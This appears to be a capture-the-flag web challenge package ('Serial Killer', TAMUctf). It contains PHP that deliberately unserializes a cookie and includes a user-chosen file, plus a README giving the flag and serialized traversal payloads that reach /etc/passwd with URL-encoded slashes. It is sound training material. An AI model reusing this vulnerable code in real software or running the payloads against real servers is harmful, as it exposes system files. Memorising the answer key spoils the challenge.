{
    "Dockerfile": "FROM php:7.2-apache\nCOPY src/ /var/www/html/\n\nRUN chmod +x /var/www/html/start.sh && \\\n    /var/www/html/start.sh && \\\n    rm /var/www/html/start.sh",
    "Makefile": "run:\n\tdocker build -t serialkiller .\n\tdocker run -d --restart=always --name tamuctf-serialkiller -p 80:80 serialkiller\nstop:\n\tdocker container rm -f tamuctf-serialkiller",
    "README.md": "# Serial Killer\n\n## Description\n\nI'm trying a new way to display files on my website. Can you try to break it for me?\n\nNote: The flag is located in the /etc/passwd file.\n\n## Solution\n\nThere is a cookie set when the page is loaded. When that cookie is decoded there is an LFI in that serialized cookie.\n```\nTzo3OiJHZXRQYWdlIjoxOntzOjQ6ImZpbGUiO3M6MTA6ImluZGV4Lmh0bWwiO30%3D\nO:7:\"GetPage\":1:{s:4:\"file\";s:10:\"index.html\";}\n```\n\nWe can use directory taversal to get back to root and then get `/etc/passwd`.\n```\nO:7:\"GetPage\":1:{s:4:\"file\";s:19:\"../../../etc/passwd\";}\n```\n\nTrying this causes a filter to trigger. To bypass the filter the `/` characters can be encoded to `%2f`.\n```\nO:7:\"GetPage\":1:{s:4:\"file\";s:25:\"..%2f..%2f..%2fetc/passwd\";}\n```\n\nThis works to get access to `/etc/passwd` and the flag inside.\n\nFlag: `gigem{1nt3r3sting_LFI_vuln}`\n",
    "src\\GetPage.php": "<?php\nclass GetPage {\n    public $file;\n\n    public function __destruct() {\n        $filter = \"../\";\n        if(strpos($this->file, $filter) !== false) {\n            echo '<div class=\"container\"><h1>You should not be doing that</h1></div>';\n            include(\"/var/www/html/index.html\");\n        } else {\n            $this->file = urldecode($this->file);\n            include(\"/var/www/html/{$this->file}\");\n        }\n    }\n}\n?>\n",
    "src\\index.html": "<!DOCTYPE html>\n<head>\n    <link rel=\"stylesheet\" href=\"static/style.css\">\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Test page</h1>\n    </div>\n    <div class=\"container\">\n        <div class=\"postcontainer\">\n            <p>If you see this the new method of getting files is working!</p>\n        </div>\n    </div>\n</body>",
    "src\\index.php": "<?php\ninclude_once 'GetPage.php';\n\nif(empty($_COOKIE['PHPSESSID']))\n{\n    $page = new GetPage;\n    $page->file = \"index.html\";\n\n    setcookie(\n        'PHPSESSID',\n        base64_encode(serialize($page)),\n        time()+60*60*24,\n        '/'\n    );\n}\n\n$cookie = base64_decode($_COOKIE['PHPSESSID']);\nunserialize($cookie);\n?>",
    "src\\start.sh": "#!/bin/bash\n\necho 'gigem{1nt3r3sting_LFI_vuln}' >> /etc/passwd\n",
    "src\\static\\style.css": "body {\n    background-color: #B6CBE2;\n    margin: 0;\n   \n    font-family: 'Noto Sans', sans-serif;\n    font-size: 100%; \n}\n\n  \na, a:visited {\n    text-decoration: none;\n    text-align: right;\n    display: block;\n    color: black;\n\n}\n\n.container {\n    max-width: 40em;  \n    margin-left: auto;\n    margin-right: auto;   \n\n    padding-top: 1rem;\n\n}\n\n.postcontainer {\n    background-color: white;\n    padding-left: 3rem;\n    padding-right: 3rem;\n    padding-top: 1rem;\n    padding-bottom: 1rem;\n    margin-top: 1rem;\n    margin-bottom: 1rem;\n}\n\np {\n    color: rgb(27, 27, 27);\n}",
    "category": "web"
}